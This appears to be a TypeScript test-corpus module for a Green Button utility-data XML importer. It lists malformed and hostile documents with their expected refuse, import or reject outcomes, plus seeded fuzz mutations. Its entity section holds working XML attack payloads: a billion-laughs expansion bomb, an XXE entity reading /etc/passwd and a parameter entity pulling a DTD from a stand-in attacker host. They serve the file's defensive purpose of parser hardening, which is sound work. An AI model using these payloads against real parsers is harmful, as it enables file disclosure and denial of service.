/**
 * The HOSTILE-XML CORPUS — every shape an untrusted Green Button document can
 * take, held as data so more than one test can run it.
 *
 * WHY A CORPUS AND NOT A HANDFUL OF CASES
 * The resource-bound work (t_2961ce14, `limits.ts`) proved four specific
 * bombs are refused. It could not say anything about the REST of the input
 * space: a corpus is what turns "these four are refused" into "here is a
 * documented set of documents, and THIS is what the app does with each" —
 * including the ones nobody thought to write a test for. It found two real
 * defects on its first run (t_9dfd150b):
 *
 *   1. A download truncated to `<?xml ` — six bytes — pinned the scanner in
 *      an infinite loop (`endOfMarkup` returned 0 instead of -1 for an
 *      unterminated `<?`/`<!`), so the import never returned and the tab
 *      spun at 100% CPU. Truncation is the most ordinary failure there is.
 *   2. The validator's English `msg`, its internal stack dump included, was
 *      printed inside the French sentence (see `parseDiagnostic.ts`).
 *
 * HOW IT IS BUILT
 *  - NAMED families: one curated document per hostile shape, each with the
 *    outcome the app must produce (`refuse` / `import` / `reject`). A change
 *    in that outcome fails the gate loudly rather than quietly.
 *  - MUTATIONS: a seeded PRNG (mulberry32) breaks a REAL export in eight
 *    ways — truncation, byte flips, a dropped closing tag, an injected `<`,
 *    a renamed element, an injected entity reference, a poisoned number, a
 *    duplicated opening tag. The seed is a constant, so a failure is
 *    reproducible to the byte: the id names the mutation (`mut-40-truncate`).
 *    Mutations declare NO expected outcome — fuzzing only guarantees the
 *    contract holds wherever the mutation lands.
 *
 * COST: the byte/depth/entry/reading bombs are refused BEFORE the parser is
 * handed the text, so they cost a scan (the 33 MB one costs a `length`
 * read). The two deliberately expensive in-budget documents (a 10 MB text
 * node, 50 000 attributes on one element) are the corpus's own measurements
 * of what a real upload can still cost: ~3 s and ~1.6 s respectively on this
 * tree. Building the corpus allocates ~50 MB of strings once per worker.
 */

import { MAX_DOCUMENT_DEPTH, MAX_ENTRIES, MAX_READINGS } from './limits';

export type CorpusFamily =
  | 'budget'
  | 'markup'
  | 'entity'
  | 'not-xml'
  | 'encoding'
  | 'numeric'
  | 'structure'
  | 'mutation'
  | 'control';

/**
 * What the app does with a document:
 *  - `refuse` — a {@link GreenButtonRefusal}: budget or a figure no bill can
 *    hold, raised BEFORE the parse, with its own copy.
 *  - `import` — the document produced USABLE rows: `countUsableRows`, main's
 *    import gate, counts electric DataPoints AND commodity-7 volume rows, so
 *    a gas extract imports rather than being rejected as empty.
 *  - `reject` — no usable rows: either the parser threw, or the document
 *    parsed to nothing. Both must end as a recovery message
 *    (greenbutton/recovery.ts).
 */
export type CorpusOutcome = 'refuse' | 'import' | 'reject';

export type CorpusCase = {
  id: string;
  family: CorpusFamily;
  xml: string;
  /** Curated cases only — see the module header. */
  expect?: CorpusOutcome;
  note: string;
};

const FEED = (body: string) =>
  `<?xml version="1.0" encoding="UTF-8"?>\n<feed xmlns="http://www.w3.org/2005/Atom" xmlns:espi="http://naesb.org/espi">\n${body}\n</feed>`;

/** One reading inside a proper UsagePoint → MeterReading → ReadingType graph. */
const READING =
  '<entry><content><espi:IntervalBlock><espi:interval><espi:duration>3600</espi:duration><espi:start>1704067200</espi:start></espi:interval><espi:IntervalReading><espi:timePeriod><espi:start>1704067200</espi:start></espi:timePeriod><espi:value>1500</espi:value></espi:IntervalReading></espi:IntervalBlock></content></entry>';

/** A UsageSummary entry carrying bill figures (the money surface). */
const SUMMARY = (fields: string) =>
  `<entry><content><espi:UsageSummary><espi:billingPeriod><espi:start>1704067200</espi:start><espi:duration>2678400</espi:duration></espi:billingPeriod>${fields}</espi:UsageSummary></content></entry>`;

const NAMED: CorpusCase[] = [
  /* ---------------------------------------------------------------- not-xml */
  { id: 'empty', family: 'not-xml', expect: 'reject', note: 'zero bytes', xml: '' },
  { id: 'whitespace', family: 'not-xml', expect: 'reject', note: 'blank file', xml: '   \n\t  ' },
  { id: 'bom-only', family: 'not-xml', expect: 'reject', note: 'BOM and nothing else', xml: '\uFEFF' },
  {
    id: 'html-doctype',
    family: 'not-xml',
    expect: 'reject',
    note: 'a portal login/error page saved instead of the export',
    xml: '<!doctype html><html><body>Session expired — sign in again</body></html>',
  },
  {
    id: 'html-tag',
    family: 'not-xml',
    expect: 'reject',
    note: 'the same mistake without a doctype',
    xml: '<html lang="en"><body>saved page</body></html>',
  },
  { id: 'json', family: 'not-xml', expect: 'reject', note: 'a JSON export', xml: '{"a":1,"b":[1,2,3]}' },
  { id: 'csv', family: 'not-xml', expect: 'reject', note: 'a CSV download', xml: 'date,kwh\n2026-01-01,1.5\n' },
  { id: 'plain', family: 'not-xml', expect: 'reject', note: 'prose', xml: 'this is not a file' },
  {
    id: 'gzip-bytes',
    family: 'not-xml',
    expect: 'reject',
    note: 'binary with the gzip magic number — a .xml.gz renamed',
    xml: '\u001f\u008b\u0008\u0000\u0000\u0000\u0000\u0000\u0003\u0000binary\u0000',
  },
  { id: 'nul-bytes', family: 'not-xml', expect: 'reject', note: 'NUL bytes inside tags', xml: '<feed>\u0000\u0000\u0000</feed>' },

  /* ----------------------------------------------------------------- markup */
  {
    id: 'xmldecl-only',
    family: 'markup',
    expect: 'reject',
    note: 'a header with no document under it',
    xml: '<?xml version="1.0" encoding="UTF-8"?>',
  },
  {
    id: 'truncated-pi',
    family: 'markup',
    expect: 'reject',
    note: 'THE SIX-BYTE DOC: download cut at `<?xml ` — this hung the scanner forever (t_9dfd150b)',
    xml: '<?xml ',
  },
  { id: 'truncated-doctype', family: 'markup', expect: 'reject', note: 'cut inside the DOCTYPE', xml: '<!DOCTYPE feed [' },
  { id: 'bare-lt', family: 'markup', expect: 'reject', note: 'cut mid-tag', xml: '<feed><entry' },
  { id: 'mismatched-close', family: 'markup', expect: 'reject', note: 'wrong closing tag', xml: '<feed><entry></feed></entry>' },
  { id: 'unclosed-root', family: 'markup', expect: 'reject', note: 'truncated mid-element', xml: '<feed><entry><content></content>' },
  { id: 'stray-lt', family: 'markup', expect: 'reject', note: 'a `<` inside a tag name', xml: '<feed><entry<content/></entry>' },
  { id: 'text-before-root', family: 'markup', expect: 'reject', note: 'text where the root element belongs', xml: 'junk<feed/>' },
  { id: 'two-roots', family: 'markup', expect: 'reject', note: 'two root elements', xml: '<a/><b/>' },
  { id: 'two-decls', family: 'markup', expect: 'reject', note: 'two XML declarations', xml: '<?xml version="1.0"?><?xml version="1.0"?><feed/>' },
  { id: 'unterminated-comment', family: 'markup', expect: 'reject', note: 'comment never closed', xml: '<feed><!-- oops <entry/></feed>' },
  { id: 'unterminated-cdata', family: 'markup', expect: 'reject', note: 'CDATA never closed', xml: '<feed><entry><![CDATA[oops</entry></feed>' },
  { id: 'dup-attr', family: 'markup', expect: 'reject', note: 'the same attribute twice', xml: '<feed><entry a="1" a="2"/></feed>' },
  { id: 'unquoted-attr', family: 'markup', expect: 'reject', note: 'an unquoted attribute value', xml: '<feed><entry a=1/></feed>' },
  { id: 'bad-charref', family: 'markup', expect: 'reject', note: 'malformed character reference', xml: '<feed><entry>&#xZZ;</entry></feed>' },
  { id: 'bare-amp', family: 'markup', expect: 'reject', note: 'an unescaped `&`', xml: '<feed><entry>a & b</entry></feed>' },
  { id: 'nul-charref', family: 'markup', expect: 'reject', note: 'a NUL character reference', xml: '<feed><entry>&#0;</entry></feed>' },
  { id: 'lone-surrogate-charref', family: 'markup', expect: 'reject', note: 'half a UTF-16 pair', xml: '<feed><entry>&#xD800;</entry></feed>' },

  /* ----------------------------------------------------------------- entity */
  {
    id: 'entity-billion-laughs',
    family: 'entity',
    expect: 'reject',
    note: 'the classic entity expansion bomb, ten levels deep',
    xml:
      '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' +
      '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">' +
      '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' +
      '<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">' +
      '<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">' +
      '<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">]>' +
      '<feed><entry>&lol6;</entry></feed>',
  },
  {
    id: 'entity-quadratic',
    family: 'entity',
    expect: 'reject',
    note: 'quadratic blowup: one 50 000-char entity referenced ten times',
    xml:
      '<!DOCTYPE feed [<!ENTITY a "' + 'A'.repeat(50_000) + '">' +
      '<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><feed><entry>&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;</entry></feed>',
  },
  {
    id: 'entity-external',
    family: 'entity',
    expect: 'reject',
    note: 'XXE: an external SYSTEM entity pointing at the local filesystem',
    xml: '<!DOCTYPE feed [<!ENTITY x SYSTEM "file:///etc/passwd">]><feed><entry>&x;</entry></feed>',
  },
  {
    id: 'entity-param',
    family: 'entity',
    expect: 'reject',
    note: 'a parameter entity pulling in a remote DTD',
    xml: '<!DOCTYPE feed [<!ENTITY % pe SYSTEM "http://evil.example/x.dtd"> %pe;]><feed/>',
  },
  {
    id: 'entity-simple',
    family: 'entity',
    expect: 'reject',
    note: 'a declared internal entity — the shape the diagnosis sniffs for',
    xml: '<!DOCTYPE feed [<!ENTITY x "hello">]><feed><entry>&x;</entry></feed>',
  },

  /* ------------------------------------------------------------------ budget */
  {
    id: 'depth-65',
    family: 'budget',
    expect: 'refuse',
    note: 'exactly one level past the ceiling (the feed tag is a level too)',
    // MAX_DOCUMENT_DEPTH levels of <a> under <feed> = ceiling + 1.
    xml: FEED('<a>'.repeat(MAX_DOCUMENT_DEPTH) + '</a>'.repeat(MAX_DOCUMENT_DEPTH)),
  },
  {
    id: 'depth-bomb-20000',
    family: 'budget',
    expect: 'refuse',
    note: '312× the ceiling; refused by the scan, never handed to the parser',
    xml: `<r>${'<a>'.repeat(20000)}${'</a>'.repeat(20000)}</r>`,
  },
  {
    id: 'bytes-over',
    family: 'budget',
    expect: 'refuse',
    note: '33 MB single text node — judged from `text.length`, before the scan',
    xml: FEED(`<entry><content><x>${'A'.repeat(33 * 1024 * 1024)}</x></content></entry>`),
  },
  {
    id: 'entries-over',
    family: 'budget',
    expect: 'refuse',
    note: 'one empty <entry> past the ceiling: 1.4 MB, inside the byte limit, over the count',
    xml: FEED('<entry/>'.repeat(MAX_ENTRIES + 1)),
  },
  {
    id: 'readings-over',
    family: 'budget',
    expect: 'refuse',
    note: 'one IntervalReading past the ceiling: 9 MB, inside the byte limit, over the count',
    xml: FEED('<IntervalReading/>'.repeat(MAX_READINGS + 1)),
  },
  {
    id: 'bill-poison',
    family: 'numeric',
    expect: 'refuse',
    note: 'a bill figure no bill can hold, beside importable readings',
    xml: FEED(
      READING +
        SUMMARY('<espi:billLastPeriod>1e308</espi:billLastPeriod><espi:costAdditionalDetailLastPeriod><espi:note>Delivery</espi:note><espi:amount>1e308</espi:amount></espi:costAdditionalDetailLastPeriod>'),
    ),
  },
  {
    id: 'bill-duration-hostile',
    family: 'numeric',
    expect: 'refuse',
    note: 'a billing period of 1e15 s (31.7 million years): one <espi:duration> used to set the gas temperature bands’ per-hour loop — t_edef78d7',
    xml: FEED(
      READING +
        '<entry><content><espi:UsageSummary><espi:billingPeriod><espi:start>1704067200</espi:start>' +
        '<espi:duration>1000000000000000</espi:duration></espi:billingPeriod>' +
        '<espi:billLastPeriod>1365030000</espi:billLastPeriod></espi:UsageSummary></content></entry>',
    ),
  },
  {
    id: 'bill-start-hostile',
    family: 'numeric',
    expect: 'refuse',
    note: 'a billing period starting 1e15 s after the epoch (year 33 657 588), duration perfectly legal: its two edges set an eon-wide span for the temperature fetch and its window caption is a date date-fns refuses to format — t_43c716ad',
    xml: FEED(
      READING +
        '<entry><content><espi:UsageSummary><espi:billingPeriod><espi:start>1000000000000000</espi:start>' +
        '<espi:duration>2678400</espi:duration></espi:billingPeriod>' +
        '<espi:billLastPeriod>1365030000</espi:billLastPeriod></espi:UsageSummary></content></entry>',
    ),
  },
  {
    id: 'clock-poison',
    family: 'numeric',
    expect: 'import',
    note: 'an impossible tzOffset is metadata: the block is dropped, the readings import',
    xml: FEED('<entry><content><espi:LocalTimeParameters><espi:tzOffset>1e308</espi:tzOffset></espi:LocalTimeParameters></content></entry>' + READING),
  },

  /* ----------------------------------------------------------------- numeric */
  { id: 'numeric-value-1e308', family: 'numeric', expect: 'reject', note: 'a reading worth 1e308 kWh', xml: FEED(READING.replace('<espi:value>1500</espi:value>', '<espi:value>1e308</espi:value>')) },
  { id: 'numeric-value-NaN', family: 'numeric', expect: 'reject', note: 'a NaN reading', xml: FEED(READING.replace('1500', 'NaN')) },
  { id: 'numeric-value-words', family: 'numeric', expect: 'reject', note: 'prose where a value belongs', xml: FEED(READING.replace('1500', 'abc')) },
  { id: 'start-huge', family: 'numeric', expect: 'import', note: 'a timestamp in year 3 116 095 is accepted — out of scope for this card, recorded for follow-up', xml: FEED(READING.replace('<espi:start>1704067200</espi:start>', '<espi:start>99999999999999</espi:start>')) },
  { id: 'start-negative', family: 'numeric', expect: 'import', note: 'a pre-epoch timestamp imports', xml: FEED(READING.replace('1704067200', '-86400')) },
  { id: 'duration-negative', family: 'numeric', expect: 'import', note: 'a negative interval duration imports', xml: FEED(READING.replace('<espi:duration>3600</espi:duration>', '<espi:duration>-1</espi:duration>')) },

  /* --------------------------------------------------------------- structure */
  { id: 'value-in-entry-text', family: 'structure', expect: 'reject', note: 'text where the entry graph belongs', xml: FEED('<entry>just text</entry>') },
  { id: 'reading-with-text-content', family: 'structure', expect: 'reject', note: 'an IntervalReading whose body is text', xml: FEED('<entry><content><espi:IntervalReading>text</espi:IntervalReading></content></entry>') },
  { id: 'entry-not-obj', family: 'structure', expect: 'reject', note: 'content that is a string, not an element', xml: FEED('<entry><content>text</content></entry>') },
  { id: 'undeclared-prefix', family: 'structure', expect: 'reject', note: 'a namespace prefix with no declaration', xml: '<?xml version="1.0"?><feed><espi:entry/></feed>' },
  { id: 'empty-ns', family: 'structure', expect: 'reject', note: 'the namespace emptied under a child', xml: '<feed xmlns="http://www.w3.org/2005/Atom"><entry xmlns=""/></feed>' },
  { id: 'cdata-entry-lookalike', family: 'structure', expect: 'reject', note: 'element-looking text inside CDATA — text, not markup, for the scanner too', xml: FEED('<content><![CDATA[<entry><IntervalReading/></entry>]]></content>') },
  { id: 'entries-no-readings', family: 'structure', expect: 'reject', note: 'metadata-only export: entries carry no IntervalReadings', xml: FEED('<entry><id>urn:uuid:1</id><title>UsagePoint</title></entry>'.repeat(3)) },
  { id: 'readings-no-timestamps', family: 'structure', expect: 'reject', note: 'readings that lost their <start>', xml: FEED('<entry><content><espi:IntervalBlock><espi:IntervalReading><espi:value>1500</espi:value></espi:IntervalReading></espi:IntervalBlock></content></entry>') },

  /* ----------------------------------------------------------------- encoding */
  { id: 'utf16le-bom', family: 'encoding', expect: 'reject', note: 'a BOM with an encoding the app does not decode', xml: '\uFEFF<?xml version="1.0" encoding="UTF-16"?><feed><entry/></feed>' },
  { id: 'control-chars', family: 'encoding', expect: 'reject', note: 'C0 control characters in element content', xml: '<feed><entry>\u0001\u0002\u0003</entry></feed>' },
  { id: 'rtl-override', family: 'encoding', expect: 'reject', note: 'a bidirectional override that reverses what the reader sees', xml: '<feed><entry>abc\u202Eevil</entry></feed>' },

  /* ------------------------------------------------------- expensive but legal */
  {
    id: 'huge-text-node-10mb',
    family: 'structure',
    expect: 'reject',
    note: '10 MB of digits in one element: in budget, ~3 s of work, nothing to import',
    xml: FEED(`<entry><content><x>${'7'.repeat(10 * 1024 * 1024)}</x></content></entry>`),
  },
  {
    id: 'attr-bomb-50k',
    family: 'structure',
    expect: 'reject',
    note: '50 000 attributes on one element: in budget, ~1.6 s of work, nothing to import',
    xml: FEED(`<entry ${Array.from({ length: 50_000 }, (_, i) => `a${i}="v${i}"`).join(' ')}/>`),
  },

  /* ----------------------------------------------------------------- control */
  { id: 'good', family: 'control', expect: 'import', note: 'THE CONTROL: a real export must still import', xml: FEED(READING) },
  {
    id: 'bill-only',
    family: 'control',
    expect: 'reject',
    note: 'a well-formed UsageSummary with no readings: bills ride with readings, so /import has nothing to write',
    xml: FEED(SUMMARY('<espi:billLastPeriod>1365030000</espi:billLastPeriod>')),
  },
  {
    id: 'good-with-200-entries',
    family: 'control',
    expect: 'import',
    note: 'a healthy document at real size: the budget must stay silent',
    xml: FEED(READING.repeat(200)),
  },
];

/** The seed, exported so a failing id reproduces exactly. */
export const MUTATION_SEED = 0x9df150b;

/** Deterministic PRNG — same seed, same corpus, every machine, every run. */
function mulberry32(seed: number): () => number {
  let a = seed;
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const MUTATION_KINDS = [
  'truncate',
  'flip',
  'drop-close',
  'inject-lt',
  'rename-tag',
  'inject-entity',
  'swap-num',
  'duplicate-open',
] as const;

/** One seeded mutation of a REAL export. Documented in the module header. */
export function mutationAt(index: number, seed: number = MUTATION_SEED): CorpusCase {
  // The PRNG is walked forward to `index` so one mutation can be rebuilt
  // without building the whole corpus — a failing id can be reproduced in
  // isolation.
  const rnd = mulberry32(seed);
  const base = FEED(READING.repeat(3));
  let kind: (typeof MUTATION_KINDS)[number] = 'truncate';
  let at = 0;
  for (let i = 0; i <= index; i++) {
    kind = MUTATION_KINDS[Math.floor(rnd() * MUTATION_KINDS.length)];
    at = Math.floor(rnd() * base.length);
  }
  let xml = base;
  switch (kind) {
    case 'truncate':
      xml = xml.slice(0, at);
      break;
    case 'flip':
      xml = xml.slice(0, at) + String.fromCharCode(32 + Math.floor(rnd() * 95)) + xml.slice(at + 1);
      break;
    case 'drop-close':
      xml = xml.slice(0, at) + xml.slice(at).replace('</', '<');
      break;
    case 'inject-lt':
      xml = xml.slice(0, at) + '<' + xml.slice(at);
      break;
    case 'rename-tag':
      xml = xml.replace('IntervalReading', 'IntervalReading\u2603');
      break;
    case 'inject-entity':
      xml = xml.slice(0, at) + '&boom;' + xml.slice(at);
      break;
    case 'swap-num':
      xml = xml.replace('1500', ['1e400', '-0', '0x10', '1..2', '1e309', 'Infinity'][Math.floor(rnd() * 6)]);
      break;
    case 'duplicate-open':
      xml = xml.slice(0, at) + '<entry>' + xml.slice(at);
      break;
  }
  return {
    id: `mut-${index}-${kind}`,
    family: 'mutation',
    xml,
    note: `seeded ${kind} of a real export (seed 0x${seed.toString(16)})`,
  };
}

/** How many seeded mutations the gate runs. */
export const MUTATION_COUNT = 160;

function mutations(): CorpusCase[] {
  return Array.from({ length: MUTATION_COUNT }, (_, i) => mutationAt(i));
}

/**
 * The whole corpus: curated families first, then the seeded mutations.
 * Built once per module load (the big cases are strings, kept for reuse by
 * every test in the worker).
 */
export const HOSTILE_CORPUS: CorpusCase[] = [...NAMED, ...mutations()];
